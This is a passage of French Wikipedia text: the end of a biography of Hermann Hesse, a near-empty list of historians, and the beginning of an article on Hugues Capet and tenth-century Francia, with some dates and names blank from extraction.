La consécration littéraire permet à Hesse d'épouser, en 1904, la photographe Maria Bernoulli (1868–1963), de s'installer avec elle à Gaienhofen au bord du lac de Constance, et d'y fonder une famille comptant trois fils, Bruno, Heiner et Martin. Il y écrit son deuxième roman "L'Ornière", paru en 1906. Par la suite, il rédige surtout des nouvelles et des poèmes. Son roman suivant, "Gertrude" (1910), évoque la crise de créativité de Hesse. Il achève péniblement cette œuvre, et la considèrera plus tard comme ratée. Les désaccords se multiplient aussi dans son ménage, et pour prendre de la distance, Hesse fait en 1911, avec , un long voyage à Ceylan et en Indonésie. Il n'y trouve pas l'inspiration spirituelle et religieuse espérée, mais ce voyage imprègnera fortement ses œuvres ultérieures, à commencer par "Carnets indiens" (1913). Après le retour de Hesse, la famille déménage en 1912 à Berne, mais ce déplacement ne résout pas les problèmes du couple, comme le dépeint Hesse en 1914 dans son roman "Roßhalde".
La Première Guerre mondiale.
À la déclaration de la Première Guerre mondiale en 1914, Hesse se présente comme volontaire à l'ambassade d'Allemagne, car il ne peut supporter de rester inactif, pendant que d'autres jeunes écrivains meurent au front. Il est néanmoins déclaré inapte au combat et affecté à Berne à l'assistance aux prisonniers de guerre, auprès de l'ambassade d'Allemagne. Dans sa nouvelle fonction, Hesse est dès lors occupé à rassembler et expédier des livres pour les prisonniers de guerre allemands. À cette époque, il est coéditeur de la "Deutsche Interniertenzeitung" ("Journal des internés allemands", 1916-1917), éditeur du "Sonntagsbote für die deutschen Kriegsgefangenen" ("Courrier dominical des prisonniers de guerre allemands", 1916-1919), et responsable de la « Librairie des prisonniers de guerre allemands ».
Le , il publie dans la "Neue Zürcher Zeitung" l'article « O Freunde, nicht diese Töne » (« O mes amis, pas sur ce ton ! », premier vers de l’"Ode à la joie"), dans lequel il appelle les intellectuels allemands à ne pas tomber dans les polémiques nationalistes. Il en résulte ce que Hesse qualifiera plus tard de grand tournant de sa vie : pour la première fois, il se retrouve au milieu d'une violente querelle politique. La presse allemande l'attaque, il reçoit des lettres de menace et de vieux amis se désolidarisent de lui. Il est soutenu par son ami Theodor Heuss, mais aussi par l'écrivain français Romain Rolland, à qui Hesse rend visite en .
Ces conflits avec le public allemand ne sont pas encore apaisés que Hesse subit une suite de coups du sort qui le plongent dans une crise existentielle plus profonde encore : la mort de son père le , la grave maladie de son fils Martin et la crise de schizophrénie de sa femme. Il doit interrompre son travail d'assistance aux prisonniers et commence un traitement psychothérapeutique. L'intense travail de psychanalyse qui s'ensuit, notamment avec le psychanalyste suisse Josef Bernhard Lang dès 1916 et au cours duquel Hesse fait aussi la connaissance de Carl Gustav Jung, débouche sur un nouveau point culminant de sa créativité : en septembre-, Hesse rédige en trois semaines d'un travail frénétique son roman "Demian". Le livre est publié après la guerre, en 1919, sous le pseudonyme d'Emil Sinclair.
La Casa Camuzzi.
Lorsque Hesse reprend ainsi sa vie civile, son couple est désuni. Malgré la guérison de sa femme de sa grave psychose, Hesse ne peut envisager aucun avenir commun avec elle. La maison de Berne est vendue, et Hesse emménage mi-avril 1918 dans le canton du Tessin, où il habite tout d'abord une petite maison paysanne à l'entrée de Minusio près de Locarno. Puis il vit du au à Sorengo. Le , il s'installe dans le village de Montagnola, près de Lugano, comme locataire de quatre petites pièces dans un bâtiment ressemblant à un château, la « Casa Camuzzi ». Là, il ne reprend pas seulement son activité d'écriture, mais commence aussi à peindre, ce qui apparaît clairement en 1920 dans son grand récit suivant, "Le Dernier Été de Klingsor". En 1922 parait le roman indien "Siddhartha", où s'exprime son amour de la culture indienne et des sagesses orientales auxquelles il avait déjà été familiarisé dans la maison de ses parents. En 1924 il épouse Ruth Wenger, fille de la femme de lettres suisse Lisa Wenger et tante de Meret Oppenheim (après le mariage avec Hesse, elle eut comme fils le futur acteur ). Et cette année-là Hesse obtient la nationalité suisse.
Les principales œuvres qui suivent, "Le Curiste" en 1925 et le "Voyage à Nüremberg" en 1927, sont des récits autobiographiques teintés d'ironie, dans lesquels s'annonce déjà le plus célèbre roman de Hesse, "Le Loup des steppes" (1927). Pour son cinquantième anniversaire, qu'il fête cette année-là, parait également sa première biographie, publiée par son ami Hugo Ball. Peu après le succès de son roman, la vie du solitaire loup des steppes Hesse prend un nouveau tour par sa relation avec Ninon Dolbin, originaire de Czernowitz en Bukovine, qui devient plus tard sa troisième femme. Le résultat de cette conversion à la vie de couple est le roman "Narcisse et Goldmund" (1930).
Hesse quitte, en 1931, la Casa Camuzzi, et s'installe avec Ninon dans une plus grande maison (la "Casa Hesse", parfois aussi appelée "Casa Rossa") dans les hauteurs de Montagnola, construite selon ses souhaits et mise à sa disposition par son ami . Cette maison est actuellement un bien privé et ne peut être visitée.
Le Jeu des perles de verre.
Dans une correspondance du , Hermann Hesse déclare vouloir défendre sa « profession de foi » qui permet de .
En 1931, il commence à composer sa dernière grande œuvre, "Le Jeu des perles de verre". Il publie en 1932 un récit préparatoire, "Le Voyage en Orient". Il observe avec beaucoup d'inquiétude la prise de pouvoir des nazis en Allemagne. En 1933, Bertolt Brecht et Thomas Mann s'arrêtent tous deux chez lui dans leur voyage vers l'exil. Hesse essaye à sa manière de contrer l'évolution de l'Allemagne. Il publie depuis des décennies des comptes-rendus de lecture dans la presse allemande. Désormais il s'y exprime plus fortement pour les auteurs (juifs ou non) pourchassés par les nazis.
À partir du milieu des années 1930, aucun journal allemand ne publie plus d'articles de Hesse. Le refuge spirituel de Hesse contre les querelles politiques, et, plus tard, contre les nouvelles terribles de la Seconde Guerre mondiale est son travail sur son roman "Le Jeu des perles de verre", publié en 1943 en Suisse. C'est en grande partie pour cette œuvre tardive que lui est décerné en 1946 le prix Nobel de littérature.
Après la Seconde Guerre mondiale, la créativité de Hesse décline : il écrit encore des nouvelles et des poèmes, mais plus aucun roman. Il est par ailleurs sollicité par un flot intarissable de lettres, le prix de sa gloire renouvelée auprès d'une nouvelle génération de lecteurs allemands, qui cherchent aide et conseil auprès du « vieux sage » de Montagnola. Hermann Hesse meurt le , il est enterré au cimetière de Sant’Abbondio, près de Montagnola, où Hugo Ball repose également. Le fonds d'archives de Hermann Hesse se trouve aux Archives littéraires suisses à Berne.
Importance de l'œuvre.
Les premières œuvres de Hesse restent dans la tradition du : son lyrisme doit tout au romantisme, il en est de même de la langue et du style de "Peter Camenzind", un livre que son auteur présentait comme un roman initiatique dans la lignée du "Henri le vert" de Gottfried Keller. Sur le fond, Hesse s'oppose à l'industrialisation croissante et à l'urbanisation, ce par quoi il rejoint une tendance des mouvements de jeunesse allemands. Hesse abandonne plus tard cette tradition néo-romantique de la forme et du fond. En revanche, la structure antithétique de "Peter Camenzind", avec le contraste entre ville et campagne et l'opposition masculin-féminin, est encore présente plus tard dans les chefs-d'œuvre de Hesse (par ex. "Demian" et "Le Loup des steppes").
La connaissance des archétypes décrits par le psychologue Carl Gustav Jung eut une influence déterminante sur l'œuvre de Hesse, visible à partir du roman "Demian" : le chemin d'une jeune personne vers soi-même devint l'un de ses thèmes de prédilection. La tradition des romans initiatiques se poursuit également avec "Demian", mais dans cet ouvrage (comme dans "Le Loup des steppes"), l'histoire ne se déroule plus sur un plan réel, mais dans un « paysage spirituel » intérieur.
Un autre aspect essentiel de l'œuvre de Hesse est la spiritualité, particulièrement présente dans le roman "Siddhartha". La thèse principale de "Siddharta" soutient que la plénitude spirituelle ne peut être trouvée ni dans le renoncement aux réalités du monde ni dans la doctrine de Bouddha, mais dans l'expérience des sens. Les syncrétismes religieux (christianisme, bouddhisme) et intellectuels (Nietzsche, Jung) qui s'y expriment sont la profession de foi de Hesse, fondée sur l'ouverture au monde, sur la découverte d'une transcendance où s'unissent la vie et l'esprit. L'auteur reprendra ces éléments dans une ébauche de théologie "(Ein Stückchen Theologie)" et dans le texte "Mein Glaube" "(Ce que je crois)".
Tous les ouvrages de Hesse comportent une part autobiographique, particulièrement visible dans "Le Loup des steppes", qui est précisément un modèle de « roman de crise existentielle ». Cette caractéristique ne disparaît que dans ses œuvres tardives. Dans les romans apparentés, "Le Voyage en Orient" et "Le Jeu des perles de verre", Hesse traita un thème qu'il avait déjà abordé dans "Peter Camenzind" : l'opposition entre vie active et vie contemplative. En partant du contexte de son époque, Hesse conçut dans "Le Jeu des perles de verre" une utopie pour l'humanité et pour l'âme, les deux éléments s'équilibrant dans un jeu d'échanges dialectiques. Bien qu'écrivant encore un roman initiatique « classique », il le fait de façon moderne, inversant les termes de la problématique maître/esclave hégélienne et nietzschéenne (dont il était un lecteur fervent) et répondant à distance au roman de Goethe, "Les Années d'apprentissage de Wilhelm Meister", qu'il considérait comme le chef-d'œuvre de la littérature allemande. En effet, le héros de Goethe s'appelle « Meister » (le « maître »), tandis que celui de Hesse se nomme « Joseph Valet », ceci de façon délibérée, Hesse considérant que seuls l'humilité et le « lâcher prise » étaient des solutions pour l'âme humaine, et l'esprit allemand en particulier (ce en quoi il s'oppose à Thomas Mann).
Réception critique.
La qualité littéraire et l'importance de l'œuvre de Hermann Hesse étaient déjà controversées de son vivant, et le débat continue aujourd'hui. Des collègues comme Thomas Mann ou Hugo Ball le tenaient en haute estime, cependant qu'à l'opposé Kurt Tucholsky disait : Alfred Döblin parla même d'une « ennuyeuse limonade ». Les premières œuvres de Hesse furent cependant en majorité jugées positivement par les critiques littéraires contemporains.
L'accueil de son œuvre dans l'Allemagne des deux Guerres mondiales fut marqué par les campagnes de presse contre l'auteur, en raison de ses prises de position contre la guerre et le nationalisme. À partir de 1937, les ouvrages de Hesse ne pouvaient être vendus que précautionneusement. De ce fait, une grande partie de la jeune génération ne découvrit Hesse qu'après 1945.
Plus de dix ans après que Hesse eut reçu le prix Nobel de littérature, Karlheinz Deschner écrivit en 1957 dans son pamphlet "Kitsch, Konvention und Kunst" "(Kitsch, convention et art)" : 
et n'émit pas non plus un jugement favorable sur sa prose. Une partie de la critique littéraire allemande adopta ce jugement pendant les décennies qui suivirent, et Hesse fut qualifié par certains de « fabricant de littérature décadente et kitsch ». C'est ainsi que l'accueil fait à Hesse poursuivit son mouvement cyclique : à peine avait-il sombré au plus profond dans les années 1960 en Allemagne, qu'éclata aux États-Unis un « Hesse boom » qui atteignit jusqu'à l'Allemagne. "Le Loup des steppes," en particulier, devint un livre à succès international (au point qu'un groupe de rock dont le chanteur était d'ailleurs d'origine allemande lui emprunta son nom : Steppenwolf), et Hesse devint l'un des auteurs allemands les plus traduits et lus dans le monde : plus de 100 millions de ses livres furent vendus. Dans les années 1970, les éditions Suhrkamp commercialisèrent des disques où Hesse récitait à la fin de sa vie des extraits de ses œuvres. En effet, dès le début de sa carrière, Hesse se voua à la lecture publique, et il transcrivit cette expérience particulière dans un texte inhabituellement joyeux, "Autorenabend" "(Soirée d'auteur)".

</doc>
<doc id="1447" url="https://fr.wikipedia.org/wiki?curid=1447" title="Liste d'historiens">
Liste d'historiens

Cet article contient une liste d'historiens par époque.
Antiquité.
Grecs.
Par ordre chronologique :
Moyen Âge.
Voir aussi : Encyclopédie de l'Histoire - Historiographie médiévale - Université de Louvain

</doc>
<doc id="1448" url="https://fr.wikipedia.org/wiki?curid=1448" title="Hugues Capet">
Hugues Capet

Hugues Capet est un roi franc issu de la branche robertienne et fondateur de la dynastie capétienne. Il est né vers 939-941, probablement à Dourdan, et mort le , probablement au lieu-dit aujourd'hui inhabité « Les Juifs », près de Prasville. Il a été duc des Francs (960-987), puis roi des Francs (987-996). Fils de Hugues le Grand et de son épouse Hedwige de Saxe, Hugues Capet est l'héritier des puissants Robertiens, une lignée en compétition pour le pouvoir avec la dynastie carolingienne et les grandes familles aristocratiques de Francie aux , mais, par sa grand-mère paternelle Béatrice de Vermandois, il descend également d'un Carolingien, Bernard roi d'Italie, petit-fils de Charlemagne. Hugues Capet est le premier roi à abandonner le germanique au profit de l'ancien français.
La fin du connaît le début d'une révolution économique et sociale qui trouve son apogée vers 1100. Les progrès agricoles, le début des défrichements et l'augmentation des capacités d'échanges entraînée par l'introduction du denier d'argent par les premiers Carolingiens, entraînent une dynamique économique encore timide mais réelle. Dans le même temps, la fin des invasions et la poursuite des guerres personnelles entraînent la construction des premiers châteaux privés où les paysans peuvent trouver refuge. En parallèle, la nouvelle élite guerrière, les chevaliers, entre en concurrence avec l'ancienne aristocratie foncière carolingienne. Pour canaliser ces nouveaux venus et pour assurer la protection de leurs biens, l'aristocratie et l'Église soutiennent et exploitent le mouvement de la paix de Dieu. C'est dans ce contexte qu'Hugues Capet peut instaurer la dynastie capétienne.
Il bénéficie tout d'abord de l'œuvre politique de son père qui parvient à contenir les ambitions de , puis à en neutraliser la lignée. Cependant, cela ne peut se faire qu'en aidant les Carolingiens, pourtant totalement évincés de la course à la couronne depuis la déchéance de Charles le Simple, à se maintenir. En 960, Hugues Capet hérite du titre de duc des Francs obtenu par son père en échange de la concession de la couronne à . Mais, avant de parvenir au pouvoir, il doit se libérer de la tutelle des Ottoniens et éliminer les derniers Carolingiens. C'est avec le soutien de l'Église, et en particulier de l'évêque Adalbéron de Reims et de Gerbert d'Aurillac, tous deux proches de la cour ottonienne, qu'il est enfin élu et sacré roi des Francs en 987.
La relative faiblesse de Hugues Capet est paradoxalement un atout pour son élection par les autres grandes familles avec le soutien des Ottoniens, car il est peu menaçant aux yeux des grands vassaux et pour les ambitions impériales. Cependant, si effectivement le nouveau roi ne parvient pas à soumettre ses vassaux indisciplinés, son règne voit une modification de la conception du royaume et du roi. Ainsi, Hugues Capet renoue avec l'Église en s'entourant systématiquement des principaux évêques et se rapproche de l'aristocratie en s'alliant avec les grands princes territoriaux (le duc de Normandie ou le comte d'Anjou), ce qui renforce son trône. Cette histoire du premier Capétien nous est surtout connue grâce au moine lettré Richer de Reims.
La "Francia occidentalis" se trouve définitivement séparée de l'Empire et le premier Capétien, comme ses successeurs, met toute son énergie à créer une dynastie pérenne en consolidant son pouvoir sur son domaine et en y associant son fils Robert le Pieux le jour de Noël de l'. En 996, à la mort de son père, Robert le Pieux est couronné. Ainsi fondée, la dynastie capétienne règne sur la France sans interruption jusqu'à la Révolution, puis de la Restauration à 1848. Cette maison donne également naissance à des lignées de souverains en Espagne, en Italie, au Luxembourg, en Hongrie, au Portugal et au Brésil.
Biographie.
Sources primaires.
L'étude du règne de Hugues Capet présente plusieurs problèmes causés par les lacunes documentaires. Aucun lettré de son temps n'a jugé nécessaire de rédiger sa biographie. Des éléments épars figurent dans l'histoire contemporaine rédigée par le moine Richer de Reims, dans la "Correspondance" de Gerbert d'Aurillac puis dans l'œuvre d'Abbon de Fleury, tous clercs et largement favorables au nouveau roi. Les événements confus qui se succèdent sont difficiles à reconstituer.
Enfance.
Hugues est peut-être né au château de Dourdan vers 939-941. Il est le fils de Hedwige de Saxe (sœur d') et d'Hugues le Grand. Une tradition historique voudrait qu'il soit le fils ou le neveu d'un boucher, elle n'est citée que par des sources postérieures (le "Purgatoire" de Dante, François Villon, une chanson de geste anonyme du XIV siècle). 
Le , Hugues le Grand meurt à Dourdan et son fils Hugues Capet est censé hériter d'une puissance de premier ordre : à Rome, le pape le reconnaît « glorieux prince des Francs ». Au milieu du , la compétition pour la couronne entre Carolingiens et Robertiens est entamée, et la victoire de ces derniers est déjà presque inéluctable. La légitimité robertienne se concrétise encore davantage par le jeu des alliances. Il coule dans les veines de Hugues Capet un peu de sang carolingien apporté par sa grand-mère paternelle (Béatrice de Vermandois), mais aussi du sang germain par ascendance directe. Cette origine proviendrait de Rhénanie et non pas de Saxe selon Karl Ferdinand Werner. Enfin, son père s'était allié avec le nouveau roi de Germanie , dont il avait épousé la sœur Hedwige de Saxe pour contrecarrer tout désir de sur la Lotharingie. Au total, à la mort de son père, Hugues Capet hérite théoriquement d'un titre prestigieux et d'une puissante principauté.
Origine de son surnom.
Le surnom « Capet » est peut-être une référence au porteur de la chape abbatiale, issue de la "cappa" ou cape de saint Martin. Hugues était en effet comme son père abbé laïc de nombreuses abbayes, notamment de la collégiale Saint-Martin de Tours, d'où le surnom peut-être ironique de "", « chapé », c'est-à-dire bien pourvu en abbayes. Il semble que ce soit Adémar de Chabannes qui, le premier, ait désigné Hugues le Grand comme « roi à la chape » dans sa chronique vers 1030.
Le premier souverain de la dynastie capétienne n'est surnommé Capet qu'au début du , époque où le mot chape est devenu chaperon ou chapeau, d'où l'étymologie légendaire donnée vers 1180 par un moine auxerrois qui fait du roi « l'homme au chapeau » n'ayant pas pu ou voulu recevoir la couronne : cette légende historique forgée "a posteriori" vient du fait que les chroniques ne détaillent pas le déroulement du sacre et du couronnement de Hugues et qu'une certaine propagande fait de l'accession au pouvoir de Hugues Capet une usurpation, puisque l'application du droit héréditaire aurait dû conduire sur le trône Charles de Lorraine. Quant à la dénomination « Capétien », elle apparaît pour la première fois à la fin du sous la plume d'un chroniqueur anglais, Raoul de Dicet.
Le royaume et la société au.
La Francie des Robertiens.
Les Robertiens.
Depuis la fin du , la politique royale ne peut se faire sans les descendants de Robert le Fort dont fait partie Hugues Capet. L'octroi de la couronne étant devenu électif, les plus grandes familles du royaume se la disputent. Les Robertiens profitent de la jeunesse puis de la déchéance de Charles le Simple pour monter sur le trône. Eudes et , respectivement grand-oncle et grand-père de Hugues Capet, ont été rois des Francs (888-898 et 922-923).
Cependant, son père Hugues le Grand est confronté à la montée en puissance de Herbert de Vermandois qui contrôle tour à tour le Vexin, la Champagne et Laon, octroie l'archevêché de Reims à son fils Hugues et s'allie à l'empereur Henri l'Oiseleur. Le Robertien, qui avait déjà dû renoncer à la couronne en 923 au profit de Raoul de Bourgogne, faute d'héritier mâle susceptible de gérer sa principauté, place sur le trône en 936 le jeune Carolingien , pourtant réfugié chez son oncle en Angleterre depuis la déchéance de son père Charles le Simple et dépourvu de toute possession en Francie, soulignant qu'il serait illégitime de pousser vers le trône quelqu'un qui serait issu d'un lignage étranger à celui de Charlemagne.
Cette manœuvre lui permet cependant de devenir le personnage le plus puissant en Francie de la première moitié du : à son avènement, lui donne le titre de "dux Francorum" (duc des Francs), ce qui annonce à nouveau le titre royal. Le roi le qualifie officiellement (peut-être sous la pression) comme « le second après nous dans tous nos royaumes ». Il gagne encore en puissance quand son grand rival Herbert de Vermandois meurt en 943, car sa puissante principauté est alors divisée entre ses quatre fils.
Hugues le Grand domine alors de nombreux territoires entre Orléans-Senlis et Auxerre-Sens, alors que le souverain carolingien est plutôt replié au nord-est de Paris (Compiègne, Laon, Soissons) (). Enfin, le duc des Francs est à la tête d'évêchés et d'abbayes comme celles de Marmoutier (près de Tours), de Fleury-sur-Loire (près d'Orléans) et de Saint-Denis. Il est aussi abbé laïc de la collégiale de Saint-Martin de Tours par laquelle Hugues le Grand et surtout son fils Hugues « Capet » hériteront peut-être de leur surnom en référence à la "cappa" (la cape de saint Martin) conservée comme relique dans ce lieu.
Sa puissance provient aussi de ses alliances : Hugues le Grand s'est marié une première fois avec Eadhild, la sœur du roi d'Angleterre Æthelstan, un des plus puissants souverains d'Occident au début du . Quand , en restaurant l'Empire, en fait la première puissance d'Europe, Hugues le Grand épouse sa sœur ! Cependant, la puissance dont doit hériter Hugues Capet a ses limites : ses vassaux sont eux-mêmes suffisamment puissants pour avoir une large autonomie et jouer une politique d'équilibre entre Carolingiens et Robertiens.
Géographie.
Le royaume recouvre l'ancienne Francie occidentale dont les frontières avaient été définies au partage de Verdun en 843. Hugues est désormais le nouveau souverain du royaume de Francie, qu'on n'appelle plus "Francia occidentalis" depuis la seconde moitié du . Les quatre fleuves (Escaut, Meuse, Saône et Rhône) constituent ses limites au nord et à l'est, le séparant de l'empire ottonien. Au sud, les Pyrénées ne constituent pas une limite puisque le comté de Barcelone fait partie du royaume français. Le royaume, duché ou comté de Bretagne ne fait pas partie du royaume de France. D'ailleurs le seigneur de Bretagne ne participe pas à l'élection de Hugues Capet. Enfin, le tracé des côtes est très différent de celui que nous connaissons, car les golfes ne sont pas colmatés, en particulier dans le bassin d'Arcachon et le golfe de Saint-Omer, et les embouchures des fleuves évoluent encore. Qu'il s'agisse du littoral charentais ou de la Flandre maritime, les côtes sont loin à l'intérieur des terres actuelles, .
Genèse d'un renouveau économique.
L'an mil connaît une croissance économique dont l'apogée se fait nettement sentir aux . Dès le milieu du , on assiste à une première phase de croissance agricole. Il semble que l'« angoisse de la faim » amène la paysannerie à produire mieux et plus. Ainsi, les paysans s'adaptent : meilleure connaissance du sol, adaptation des labours selon le milieu, introduction de l'assolement triennal, lequel entraîne les défrichements pour accroître les surfaces cultivées, optimisation de la force animale (collier d'épaule et fer à cheval), charrue à soc dissymétrique, développement de la micro-hydraulique (fossé de drainage et irrigation).
La monnaie d'argent avait toujours été utilisée depuis la romanisation de la Gaule. L'or, introduit par César à Rome et généralisé par Auguste à l'ensemble de l'Empire, complétait les possibilités de paiement des échanges. Or, d'une part l'or n'arrive plus d'Orient à la suite des conquêtes arabes en Méditerranée ; d'autre part depuis la chute de l'Empire Romain au , la plus grande confusion règne en matière de frappe et d'émission de monnaie - confusion qui entraîne une désaffection. L'homogénéisation des poids, des équivalences, des frappes et des émissions de la monnaie par les premiers Carolingiens, a réintroduit l'usage, le recours et la circulation de la monnaie d'argent, provoquant une véritable mutation économique qui porte pleinement ses fruits avec la fin des invasions. Plus adapté que la monnaie d'or héritée de l'Antiquité qui ne convient que pour des transactions très onéreuses, le denier d'argent, normalisé et abondant, permet l'introduction de millions de producteurs et de consommateurs dans le circuit commercial. Les paysans commencent à pouvoir revendre leur surplus et deviennent donc intéressés à produire au-delà de ce qui est nécessaire à leur subsistance et aux droits seigneuriaux. Ce phénomène est attesté par la multiplication des marchés et des ateliers de frappe de monnaie dans tout l’Occident dès le . Dans certains cas, les propriétaires, ecclésiastiques ou laïcs, fournissent des charrues, investissent dans des équipements améliorant la productivité : moulins en remplacement des meules à bras, pressoirs à huile ou à vin (en remplacement du foulage), etc. La redécouverte des capacités de l'énergie hydraulique plutôt qu’animale ou humaine permet une productivité sans comparaison avec celle disponible dans le haut Moyen Âge et comparable à celle des Romains qui se servaient déjà de moteurs hydrauliques installés en série à flanc de collines ou de montagnes. Chaque meule d'un moulin à eau peut moudre cent cinquante kilogrammes de blé à l'heure, ce qui correspond au travail de quarante esclaves.
Les rendements des terres cultivées peuvent atteindre jusqu'à cinq ou six pour un. Ces progrès dégagent de la main-d’œuvre pour d’autres activités. Pierre Bonnassie a montré que, après les grandes famines de 1005-1006 et de 1032-1033, la population devient de moins en moins exposée aux dérèglements alimentaires et, par voie de conséquence, aux épidémies : la mortalité diminue. Il ne faudrait pas surestimer cette époque de renouveau économique et social car le changement n'en est qu'à sa genèse et la paysannerie est encore la victime de mauvaises récoltes, comme sous le règne de Robert le Pieux lors duquel se produisent, selon Raoul Glaber, des famines foudroyantes où le cannibalisme est de règle dans certaines régions (1005-1006 et 1032-1033). La croissance démographique et l'augmentation de la production agricole s'auto-entretiennent en un cercle vertueux : elles sont la clef du renouveau médiéval.
La société carolingienne s'efface progressivement. Ainsi, on constate la disparition de l'esclavage dans le Midi au profit des paysans libres. Néanmoins, un nouveau pouvoir s'affirme : la seigneurie banale. À partir de 990, l'effritement des institutions de l'époque précédente amène à un nouvel usage, celui des « coutumes ». Au , il s'agit des droits exigés par le seigneur banal et qu'aucune autorité supérieure n'est capable de contrer. Cependant, la mise en place de la seigneurie n'empêche pas le progrès technique et l'avancée agricole.
Le denier d'argent est l'un des principaux moteurs de la croissance économique depuis le . La faiblesse du pouvoir royal a entraîné la frappe de monnaie par de nombreux évêques, seigneurs et abbayes. Alors que Charles le Chauve comptait de frappe monétaire, Hugues Capet et Robert le Pieux n'ont plus que celui de Laon. Le règne de Hugues Capet marque l'apogée de la féodalisation de la monnaie. Il en résulte une diminution de l'uniformité du denier et l'apparition de la pratique de la refrappe de la monnaie aux marchés (on se fie au poids de la pièce pour en déterminer la valeur). Par contre, l'augmentation des échanges est soutenue par celle du volume de métal disponible. En effet, l'expansion vers l'est de l'empire permet aux Ottoniens de pouvoir exploiter de nouveaux gisements d'argent. La marge de manœuvre de Robert le Pieux est faible. Or, la pratique du rognage ou des mutations entraîne des dévaluations préjudiciables.
Renouveau spirituel.
L'Église n'est pas épargnée par les désordres des . Des charges d'abbés, paroissiales ou ecclésiastiques, sont données à des laïcs pour se former des clientèles et la discipline monastique se relâche ; le niveau culturel des prêtres devient médiocre. En contrepoint, les rares monastères qui ont conservé une conduite irréprochable acquièrent une grande autorité morale. Ces monastères intègres reçoivent de nombreuses donations pour obtenir des prières d'absolution, en particulier "postmortem". Le choix des abbés s'oriente de plus en plus vers des hommes d'une grande intégrité et certains tels Guillaume d'Aquitaine vont jusqu'à donner l'autonomie et l'immunité à des monastères qui élisent leur abbé. C'est le cas des abbayes de Gorze, Brogne ou Cluny. D'autres monastères utilisent de faux certificats d'immunité pour acquérir leur autonomie.
Parmi eux, Cluny connaît le développement et l'influence les plus remarquables. Sous la férule d'abbés dynamiques tels qu'Odon, Maïeul — un ami personnel de Hugues Capet — ou encore Odilon, l'abbaye entraîne d'autres monastères qui lui sont rattachés, et constitue bientôt un ordre très puissant (en 994, l'ordre de Cluny compte déjà trente-quatre couvents). L'une des grandes forces de Cluny est de recruter une bonne partie de ses membres et particulièrement ses abbés dans la haute aristocratie.
Ces monastères sont le fer de lance d'un profond mouvement de réforme monastique. Leur œuvre moralisatrice touche bientôt tous les niveaux de la société. En particulier, elle s'attaque à canaliser la chevalerie par le mouvement de la Paix de Dieu puis de la Trêve de Dieu. Ce mouvement, très influent, pousse à la création d'États stables et en paix. Ces réformateurs ont le souvenir de l'empire carolingien qui soutenait la réforme bénédictine, la fondation de nombreuses abbayes et leur épanouissement spirituel, s'appuyant largement sur l'Église pour gouverner. La montée en puissance des Ottoniens leur donne l'occasion d'œuvrer à la reconstitution d'un empire universel. Hugues Capet, abbé laïc mais soutenant activement la réforme, est un candidat idéal pour occuper le trône de Francie car il est aussi considéré comme insuffisamment puissant pour échapper à l'influence des Ottoniens.
« Mutation féodale ».
Le contexte historique est celui de la « mutation féodale ». Cette notion que Georges Duby centre autour de l'an mil est discutée par Dominique Barthélemy pour qui cette évolution se déroule sur plusieurs siècles.
L’empire carolingien se désagrège dès le milieu du . Avec l'arrêt de l'expansion territoriale, les empereurs n'ont plus de nouvelles terres ou charges pour rétribuer leurs vassaux et n'ont donc plus prise sur eux. Peu à peu, ils doivent leur concéder la transmission héréditaire de terres et de charges, puis une autonomie de plus en plus grande. D'autre part, sur le plan militaire, l’ost carolingien puissant mais lent à rassembler se révèle incapable de répondre aux raids vikings ou sarrasins dont le principal atout est la mobilité. Les châteaux en bois ou mottes castrales sont apparus aux alentours de l'an mil entre la Loire et le Rhin. Cela répond aussi à la logique d'une société médiévale qui évolue : à partir de 980, le royaume des Francs est secoué par la « révolution aristocratique » qui voit les campagnes se couvrir de ces forteresses primitives en bois.
Autour d'elles prolifèrent les nouvelles coutumes ("mals usos"). Les vieux "pagi" carolingiens sont éclipsés par un nouveau ressort territorial fondé sur le territoire du château ("districtus"). Les châteaux (les mottes) initialement conçus comme refuges, deviennent le signe de l'autorité, du développement économique et de l’expansion des terroirs.
L'histoire romantique du décrit une « anarchie généralisée » et une France « hérissée » de châteaux autour de l'an mil. On est actuellement plus nuancé sur la réalité de ce phénomène car, dès l'origine, les autorités tentent de canaliser les constructions castrales. Des actes qui révèlent cette volonté d'interdire les constructions fortifiées ont été conservés : le "Capitulaire de Pîtres" (864) ou encore les "Consuetudines et Justicie" normandes (1091). Mais, dans ces temps d'invasions et de guerres privées continuelles, les habitants viennent se regrouper à proximité du château, ce qui légitime le châtelain et l'exercice du ban seigneurial : on parle d'incastellamento pour le Midi et d'encellulement pour le Nord de la France.
Dès lors, cette nouvelle élite guerrière appuyée sur ces châteaux entre en conflit d'intérêts avec l'aristocratie et l'Église dont les revenus dépendent de l'économie paysanne. Comtes, évêques et abbés qui appartiennent à de grandes lignées aristocratiques doivent réagir pour réfréner les ambitions qui entraînent nombre de guerres privées et pillages. Ces représentants des grandes familles exploitent et propagent le mouvement de la paix de Dieu, né de l'exaspération des paysans et des clercs soumis à l'arbitraire des hommes en armes ("milites"). La codification et la moralisation de la conduite des chevaliers sur des critères religieux entraînent l'élaboration, par l'évêque Adalbéron de Laon, d'une société divisée en trois ordres sociaux : ceux qui travaillent ("laboratores"), ceux qui prient ("oratores") et ceux qui combattent ("bellatores").
Enfin, malgré la décentralisation du pouvoir, le roi conserve une autorité politique. L'époque est à la revendication de terres et de charges ; aussi, l'hommage rendu à son suzerain permet d'en officialiser la propriété. Le roi, qui est sacré, garde donc un rôle arbitral qui permet à la fonction de durer au . Au , elle est encore remise en cause par certains princes (comtes de Blois, comte de Vermandois).
La Francie sous l'influence des Ottoniens.
En 956, à la mort de son père, Hugues, l’aîné, n'est âgé que d'une quinzaine d'années et a deux frères. , roi de Germanie, entend mettre sous tutelle la Francie occidentale, ce qui lui est possible étant l'oncle maternel de Hugues et de Lothaire, nouveau roi des Francs qui a succédé à l'âge de à en 954. Le royaume de Francie en 954 et la principauté robertienne en 956 sont mis sous la tutelle de Brunon, archevêque de Cologne et duc de Lotharingie, frère du roi . La tutelle de Hugues est doublée par celle de Lothaire. L'objectif d' est de maintenir l'équilibre entre les Robertiens, les Carolingiens et les Ottoniens. En 960, le roi des Francs consent à rendre à Hugues l'héritage de son père, avec le marquisat de Neustrie et le titre de duc des Francs. Mais, en contrepartie, le duc doit accepter la nouvelle indépendance acquise par les comtes de Neustrie pendant la vacance du pouvoir. Son frère Otton n'obtient que le duché de Bourgogne. Andrew W. Lewis a ainsi cherché à montrer qu'Hugues le Grand avait préparé une politique patrimoniale pour assurer à son fils aîné la majeure partie de son héritage comme le faisaient toutes les grandes familles dès cette époque.
